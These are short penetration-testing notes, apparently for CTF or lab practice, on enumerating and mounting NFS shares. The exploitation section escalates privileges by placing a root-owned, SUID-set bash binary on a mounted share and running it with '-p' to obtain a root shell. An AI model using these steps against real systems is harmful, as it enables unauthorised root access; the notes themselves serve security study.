# NFS

## Network File System

Allows a system to share directories and files with others over a network. Users and programs can access files on a remote system as if they were local. This is accomplished by mounting all, or a portion of a file system on a server. The mounted portion can be accessed.

### Enumeration

`nfs-common`

[nfs-common Information](https://packages.ubuntu.com/xenial/nfs-common)

```bash
sudo apt install nfs-common
```

* Includes programs such as:

```bash
lockd
statd
showmount
nfsstat
gssd
idmapd
mount.nfs
```

__Mounting NFS Shares__

Attacker system needs a directory where all the content shared by the host server in the export folder ca be accessed. Folder can be created anywhere on the system.

```bash
sudo mount -t nfs [IP]:[share] /tmp/mount/ -nolock
```

| Tag | Function |
| --- | --- |
| `sudo` | Run as root |
| `mount` | Execute the mount command |
| `-t nfs` | Type of device to mount, then specify that it's NFS |
| `[IP]:[share}` | IP address of the NFS server, and the name of the share we wish to mount |
| `-nolock` | Specifies not to use NLM locking |

```bash
showmount -e [IP]
```

```bash
mkdir /tmp/mount 
```

```bash
sudo mount -t nfs 10.10.14.219:/home /tmp/mount/ -nolock
```

# NFS Exploitation

[Ubuntu Server bash executable](https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash)

Place in mount directory on attack machine
Must be owned by root

```bash
sudo chown root bash
```

Set SUID bit

```bash
sudo chmod +s bash
```

```bash
./bash -p
```